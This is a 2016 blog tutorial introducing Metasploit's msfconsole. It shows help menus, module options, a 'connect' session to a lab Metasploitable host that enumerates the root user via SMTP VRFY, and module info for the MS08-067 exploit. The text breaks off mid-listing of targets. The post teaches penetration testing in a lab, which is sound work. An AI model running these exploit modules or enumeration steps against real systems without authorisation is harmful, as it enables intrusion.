
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>Pentest tools - Metasploit - Core dump overflow</title>
  <meta name="author" content="chousensha">

  
  
  <meta name="description" content="Metasploit 101">
  <meta name="keywords" content="pentesting, metasploit, hacking, penetration testing, metasploit tutorial, metasploit guide, metasploitable, hacking lab, pentest lab, metasploit commands">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://chousensha.github.io/blog/2016/06/11/pentest-tools-metasploit">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="Core dump overflow" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  
  <script type="text/javascript">
    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', 'UA-51216602-2']);
    _gaq.push(['_trackPageview']);

    (function() {
      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();
  </script>


</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">Core dump overflow</a></h1>
  
    <h2>Core dump in progress...</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:chousensha.github.io" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/where-to-start">Where to start</a></li>
  <li><a href="/book-corner">Book corner</a></li>
  <li><a href="/blog/archives">Archives</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div>
<article class="hentry" role="article">
  
  <header>
    
      <h1 class="entry-title">Pentest tools - Metasploit</h1>
    
    
      <p class="meta">
        








  


<time datetime="2016-06-11T13:57:36-04:00" pubdate data-updated="true">Jun 11<span>th</span>, 2016</time>
        
           | <a href="#disqus_thread"
             data-disqus-identifier="http://chousensha.github.io">Comments</a>
        
      </p>
    
  </header>


<div class="entry-content"><p>In this post I am going to focus on the use of Metasploit.</p>

<p>Before starting, I want to leave here some links to good resources for learning Metasploit:</p>

<p><a href="https://www.offensive-security.com/metasploit-unleashed/">Offensive Security Metasploit Unleashed free training course</a></p>

<p><a href="http://www.securitytube.net/groups?operation=view&amp;groupId=8">SecurityTube Metasploit Megaprimer</a></p>

<p><a href="https://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf">SANS Metasploit Cheatsheet</a></p>

<p><a href="http://www.amazon.com/Metasploit-Penetration-Testers-David-Kennedy/dp/159327288X?ie=UTF8&amp;*Version*=1&amp;*entries*=0">Metasploit: The Penetration Tester&rsquo;s Guide</a></p>

<!-- more -->


<h1>Msfconsole</h1>

<p>The <code>msfconsole</code> (Metasploit Framework Console) is where you will be spending most of your time when working with Metasploit. You can do almost everything from here, but the amount of commands might seem overwhelming at first.</p>

<p><img class="center" src="/images/tools/metasploit/msfbanner.png" title="msfconsole" alt="metasploit framework"></p>

<p>Besides the Metasploit functionality, you <strong>can run external commands in the console</strong>, which is really helpful.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; uname -a
</span><span class='line'>[*] exec: uname -a
</span><span class='line'>
</span><span class='line'>Linux pwnbox 4.0.0-kali1-amd64 #1 SMP Debian 4.0.4-1+kali2 (2015-06-03) x86_64 GNU/Linux</span></code></pre></td></tr></table></div></figure>


<p>The first thing you probably want to do is look at the help menu:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; help
</span><span class='line'>
</span><span class='line'>Core Commands
</span><span class='line'>=============
</span><span class='line'>
</span><span class='line'>    Command       Description
</span><span class='line'>    -------       -----------
</span><span class='line'>    ?             Help menu
</span><span class='line'>    advanced      Displays advanced options for one or more modules
</span><span class='line'>    back          Move back from the current context
</span><span class='line'>    banner        Display an awesome metasploit banner
</span><span class='line'>    cd            Change the current working directory
</span><span class='line'>    color         Toggle color
</span><span class='line'>    connect       Communicate with a host
</span><span class='line'>    edit          Edit the current module with $VISUAL or $EDITOR
</span><span class='line'>    exit          Exit the console
</span><span class='line'>    get           Gets the value of a context-specific variable
</span><span class='line'>    getg          Gets the value of a global variable
</span><span class='line'>    grep          Grep the output of another command
</span><span class='line'>    help          Help menu
</span><span class='line'>    info          Displays information about one or more modules
</span><span class='line'>    irb           Drop into irb scripting mode
</span><span class='line'>    jobs          Displays and manages jobs
</span><span class='line'>    kill          Kill a job
</span><span class='line'>    load          Load a framework plugin
</span><span class='line'>    loadpath      Searches for and loads modules from a path
</span><span class='line'>    makerc        Save commands entered since start to a file
</span><span class='line'>    options       Displays global options or for one or more modules
</span><span class='line'>    popm          Pops the latest module off the stack and makes it active
</span><span class='line'>    previous      Sets the previously loaded module as the current module
</span><span class='line'>    pushm         Pushes the active or list of modules onto the module stack
</span><span class='line'>    quit          Exit the console
</span><span class='line'>    reload_all    Reloads all modules from all defined module paths
</span><span class='line'>    rename_job    Rename a job
</span><span class='line'>    resource      Run the commands stored in a file
</span><span class='line'>    route         Route traffic through a session
</span><span class='line'>    save          Saves the active datastores
</span><span class='line'>    search        Searches module names and descriptions
</span><span class='line'>    sessions      Dump session listings and display information about sessions
</span><span class='line'>    set           Sets a context-specific variable to a value
</span><span class='line'>    setg          Sets a global variable to a value
</span><span class='line'>    show          Displays modules of a given type, or all modules
</span><span class='line'>    sleep         Do nothing for the specified number of seconds
</span><span class='line'>    spool         Write console output into a file as well the screen
</span><span class='line'>    threads       View and manipulate background threads
</span><span class='line'>    unload        Unload a framework plugin
</span><span class='line'>    unset         Unsets one or more context-specific variables
</span><span class='line'>    unsetg        Unsets one or more global variables
</span><span class='line'>    use           Selects a module by name
</span><span class='line'>    version       Show the framework and console library version numbers
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<p>Every time you enter a new context, you can use <strong>help</strong> to see the options available for that context. For instance, after selecting an exploit:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use exploit/linux/http/advantech_switch_bash_env_exec
</span><span class='line'>msf exploit(advantech_switch_bash_env_exec) &gt; help
</span><span class='line'>...
</span><span class='line'>Exploit Commands
</span><span class='line'>================
</span><span class='line'>
</span><span class='line'>    Command       Description
</span><span class='line'>    -------       -----------
</span><span class='line'>    check         Check to see if a target is vulnerable
</span><span class='line'>    exploit       Launch an exploit attempt
</span><span class='line'>    pry           Open a Pry session on the current module
</span><span class='line'>    rcheck        Reloads the module and checks if the target is vulnerable
</span><span class='line'>    reload        Just reloads the module
</span><span class='line'>    rerun         Alias for rexploit
</span><span class='line'>    rexploit      Reloads the module and launches an exploit attempt
</span><span class='line'>    run           Alias for exploit</span></code></pre></td></tr></table></div></figure>


<p>Or after setting a payload:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Payload Commands
</span><span class='line'>================
</span><span class='line'>
</span><span class='line'>    Command       Description
</span><span class='line'>    -------       -----------
</span><span class='line'>    check         Check to see if a target is vulnerable
</span><span class='line'>    generate      Generates a payload
</span><span class='line'>    pry           Open a Pry session on the current module
</span><span class='line'>    reload        Reload the current module from disk</span></code></pre></td></tr></table></div></figure>


<p>Many commands also have their own help menu that you can access by typing <code>help cmd</code> or by passing the -h switch: <code>cmd -h</code>. Let&rsquo;s now glance over some core commands</p>

<h2>Core commands</h2>

<ul>
<li><strong>advanced</strong> &ndash; shows advanced options for a module</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(usermap_script) &gt; advanced
</span><span class='line'>
</span><span class='line'>Module advanced options (exploit/multi/samba/usermap_script):
</span><span class='line'>
</span><span class='line'>   Name           : CHOST
</span><span class='line'>   Current Setting: 
</span><span class='line'>   Description    : The local client address
</span><span class='line'>
</span><span class='line'>   Name           : CPORT
</span><span class='line'>   Current Setting: 
</span><span class='line'>   Description    : The local client port
</span><span class='line'>
</span><span class='line'>   Name           : ConnectTimeout
</span><span class='line'>   Current Setting: 10
</span><span class='line'>   Description    : Maximum number of seconds to establish a TCP connection
</span><span class='line'>
</span><span class='line'>   Name           : ContextInformationFile
</span><span class='line'>   Current Setting: 
</span><span class='line'>   Description    : The information file that contains context information
</span><span class='line'>
</span><span class='line'>   Name           : DisablePayloadHandler
</span><span class='line'>   Current Setting: false
</span><span class='line'>   Description    : Disable the handler code for the selected payload
</span><span class='line'>
</span><span class='line'>   Name           : EnableContextEncoding
</span><span class='line'>   Current Setting: false
</span><span class='line'>   Description    : Use transient context when encoding payloads
</span><span class='line'>
</span><span class='line'>   Name           : NTLM::SendLM
</span><span class='line'>   Current Setting: true
</span><span class='line'>   Description    : Always send the LANMAN response (except when NTLMv2_session is 
</span><span class='line'>      specified)
</span><span class='line'>
</span><span class='line'>   Name           : NTLM::SendNTLM
</span><span class='line'>   Current Setting: true
</span><span class='line'>   Description    : Activate the 'Negotiate NTLM key' flag, indicating the use of 
</span><span class='line'>      NTLM responses
</span><span class='line'>
</span><span class='line'>   Name           : NTLM::SendSPN
</span><span class='line'>   Current Setting: true
</span><span class='line'>   Description    : Send an avp of type SPN in the ntlmv2 client blob, this allows 
</span><span class='line'>      authentication on Windows 7+/Server 2008 R2+ when SPN is 
</span><span class='line'>      required
</span><span class='line'>
</span><span class='line'>   Name           : NTLM::UseLMKey
</span><span class='line'>   Current Setting: false
</span><span class='line'>   Description    : Activate the 'Negotiate Lan Manager Key' flag, using the LM key 
</span><span class='line'>      when the LM response is sent
</span><span class='line'>
</span><span class='line'>   Name           : NTLM::UseNTLM2_session
</span><span class='line'>   Current Setting: true
</span><span class='line'>   Description    : Activate the 'Negotiate NTLM2 key' flag, forcing the use of a 
</span><span class='line'>      NTLMv2_session
</span><span class='line'>
</span><span class='line'>   Name           : NTLM::UseNTLMv2
</span><span class='line'>   Current Setting: true
</span><span class='line'>   Description    : Use NTLMv2 instead of NTLM2_session when 'Negotiate NTLM2' key 
</span><span class='line'>      is true
</span><span class='line'>
</span><span class='line'>   Name           : Proxies
</span><span class='line'>   Current Setting: 
</span><span class='line'>   Description    : A proxy chain of format type:host:port[,type:host:port][...]
</span><span class='line'>
</span><span class='line'>   Name           : SMB::ChunkSize
</span><span class='line'>   Current Setting: 500
</span><span class='line'>   Description    : The chunk size for SMB segments, bigger values will increase 
</span><span class='line'>      speed but break NT 4.0 and SMB signing
</span><span class='line'>
</span><span class='line'>   Name           : SMB::Native_LM
</span><span class='line'>   Current Setting: Windows 2000 5.0
</span><span class='line'>   Description    : The Native LM to send during authentication
</span><span class='line'>
</span><span class='line'>   Name           : SMB::Native_OS
</span><span class='line'>   Current Setting: Windows 2000 2195
</span><span class='line'>   Description    : The Native OS to send during authentication
</span><span class='line'>
</span><span class='line'>   Name           : SMB::VerifySignature
</span><span class='line'>   Current Setting: false
</span><span class='line'>   Description    : Enforces client-side verification of server response signatures
</span><span class='line'>
</span><span class='line'>   Name           : SMBDirect
</span><span class='line'>   Current Setting: true
</span><span class='line'>   Description    : The target port is a raw SMB service (not NetBIOS)
</span><span class='line'>
</span><span class='line'>   Name           : SMBDomain
</span><span class='line'>   Current Setting: .
</span><span class='line'>   Description    : The Windows domain to use for authentication
</span><span class='line'>
</span><span class='line'>   Name           : SMBName
</span><span class='line'>   Current Setting: *SMBSERVER
</span><span class='line'>   Description    : The NetBIOS hostname (required for port 139 connections)
</span><span class='line'>
</span><span class='line'>   Name           : SMBPass
</span><span class='line'>   Current Setting: 
</span><span class='line'>   Description    : The password for the specified username
</span><span class='line'>
</span><span class='line'>   Name           : SMBUser
</span><span class='line'>   Current Setting: 
</span><span class='line'>   Description    : The username to authenticate as
</span><span class='line'>
</span><span class='line'>   Name           : SSL
</span><span class='line'>   Current Setting: false
</span><span class='line'>   Description    : Negotiate SSL for outgoing connections
</span><span class='line'>
</span><span class='line'>   Name           : SSLCipher
</span><span class='line'>   Current Setting: 
</span><span class='line'>   Description    : String for SSL cipher - "DHE-RSA-AES256-SHA" or "ADH"
</span><span class='line'>
</span><span class='line'>   Name           : SSLVerifyMode
</span><span class='line'>   Current Setting: PEER
</span><span class='line'>   Description    : SSL verification method (Accepted: CLIENT_ONCE, 
</span><span class='line'>      FAIL_IF_NO_PEER_CERT, NONE, PEER)
</span><span class='line'>
</span><span class='line'>   Name           : SSLVersion
</span><span class='line'>   Current Setting: TLS1
</span><span class='line'>   Description    : Specify the version of SSL/TLS to be used (TLS and SSL23 are 
</span><span class='line'>      auto-negotiate) (Accepted: SSL2, SSL3, SSL23, TLS, TLS1, TLS1.1, 
</span><span class='line'>      TLS1.2)
</span><span class='line'>
</span><span class='line'>   Name           : VERBOSE
</span><span class='line'>   Current Setting: false
</span><span class='line'>   Description    : Enable detailed status messages
</span><span class='line'>
</span><span class='line'>   Name           : WORKSPACE
</span><span class='line'>   Current Setting: 
</span><span class='line'>   Description    : Specify the workspace for this module
</span><span class='line'>
</span><span class='line'>   Name           : WfsDelay
</span><span class='line'>   Current Setting: 0
</span><span class='line'>   Description    : Additional delay when waiting for a session</span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>back</strong> &ndash; allows you to go back from the current module</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(usermap_script) &gt; back
</span><span class='line'>msf &gt; </span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>connect</strong> &ndash; connect to a host on the specified port, like you would do with netcat</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; connect -h
</span><span class='line'>Usage: connect [options] &lt;host&gt; &lt;port&gt;
</span><span class='line'>
</span><span class='line'>Communicate with a host, similar to interacting via netcat, taking advantage of
</span><span class='line'>any configured session pivoting.
</span><span class='line'>
</span><span class='line'>OPTIONS:
</span><span class='line'>
</span><span class='line'>    -C        Try to use CRLF for EOL sequence.
</span><span class='line'>    -P &lt;opt&gt;  Specify source port.
</span><span class='line'>    -S &lt;opt&gt;  Specify source address.
</span><span class='line'>    -c &lt;opt&gt;  Specify which Comm to use.
</span><span class='line'>    -h        Help banner.
</span><span class='line'>    -i &lt;opt&gt;  Send the contents of a file.
</span><span class='line'>    -p &lt;opt&gt;  List of proxies to use.
</span><span class='line'>    -s        Connect with SSL.
</span><span class='line'>    -u        Switch to a UDP socket.
</span><span class='line'>    -w &lt;opt&gt;  Specify connect timeout.
</span><span class='line'>    -z        Just try to connect, then return.
</span><span class='line'>
</span><span class='line'>msf &gt; connect 192.168.80.156 25
</span><span class='line'>[*] Connected to 192.168.80.156:25
</span><span class='line'>220 metasploitable.localdomain ESMTP Postfix (Ubuntu)
</span><span class='line'>VRFY root
</span><span class='line'>252 2.0.0 root</span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>info</strong> &ndash; lists detailed information about a module, including description, vulnerable targets, payload information and more</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; info exploit/windows/smb/ms08_067_netapi
</span><span class='line'>
</span><span class='line'>       Name: MS08-067 Microsoft Server Service Relative Path Stack Corruption
</span><span class='line'>     Module: exploit/windows/smb/ms08_067_netapi
</span><span class='line'>   Platform: Windows
</span><span class='line'> Privileged: Yes
</span><span class='line'>    License: Metasploit Framework License (BSD)
</span><span class='line'>       Rank: Great
</span><span class='line'>  Disclosed: 2008-10-28
</span><span class='line'>
</span><span class='line'>Provided by:
</span><span class='line'>  hdm &lt;x@hdm.io&gt;
</span><span class='line'>  Brett Moore &lt;brett.moore@insomniasec.com&gt;
</span><span class='line'>  frank2 &lt;frank2@dc949.org&gt;
</span><span class='line'>  jduck &lt;jduck@metasploit.com&gt;
</span><span class='line'>
</span><span class='line'>Available targets:
</span><span class='line'>  Id  Name
</span><span class='line'>  --  ----
</span><span class='line'>  0   Automatic Targeting
</span><span class='line'>  1   Windows 2000 Universal
</span><span class='line'>  2   Windows XP SP0/SP1 Universal
</span><span class='line'>  3   Windows 2003 SP0 Universal
</span><span class='line'>  4   Windows XP SP2 English (AlwaysOn NX)
</span><span class='line'>  5   Windows XP SP2 English (NX)
</span><span class='line'>  6   Windows XP SP3 English (AlwaysOn NX)
</span><span class='line'>  7   Windows XP SP3 English (NX)
</span><span class='line'>  8   Windows XP SP2 Arabic (NX)
</span><span class='line'>  9   Windows XP SP2 Chinese - Traditional / Taiwan (NX)
</span><span class='line'>  10  Windows XP SP2 Chinese - Simplified (NX)
</span><span class='line'>  11  Windows XP SP2 Chinese - Traditional (NX)
</span><span class='line'>  12  Windows XP SP2 Czech (NX)
</span><span class='line'>  13  Windows XP SP2 Danish (NX)
</span><span class='line'>  14  Windows XP SP2 German (NX)
</span><span class='line'>  15  Windows XP SP2 Greek (NX)
</span><span class='line'>  16  Windows XP SP2 Spanish (NX)
</span><span class='line'>  17  Windows XP SP2 Finnish (NX)
</span><span class='line'>  18  Windows XP SP2 French (NX)
</span><span class='line'>  19  Windows XP SP2 Hebrew (NX)
</span><span class='line'>  20  Windows XP SP2 Hungarian (NX)
</span><span class='line'>  21  Windows XP SP2 Italian (NX)
</span><span class='line'>  22  Windows XP SP2 Japanese (NX)
</span><span class='line'>  23  Windows XP SP2 Korean (NX)
</span><span class='line'>  24  Windows XP SP2 Dutch (NX)
</span><span class='line'>  25  Windows XP SP2 Norwegian (NX)
</span><span class='line'>  26  Windows XP SP2 Polish (NX)
</span><span class='line'>  27  Windows XP SP2 Portuguese - Brazilian (NX)
</span><span class='line'>  28  Windows XP SP2 Portuguese (NX)
</span><span class='line'>  29  Windows XP SP2 Russian (NX)
</span><span class='line'>  30  Windows XP SP2 Swedish (NX)
</span><span class='line'>  31  Windows XP SP2 Turkish (NX)
</span><span class='line'>  32  Windows XP SP3 Arabic (NX)
</span><span class='line'>  33  Windows XP SP3 Chinese - Traditional / Taiwan (NX)
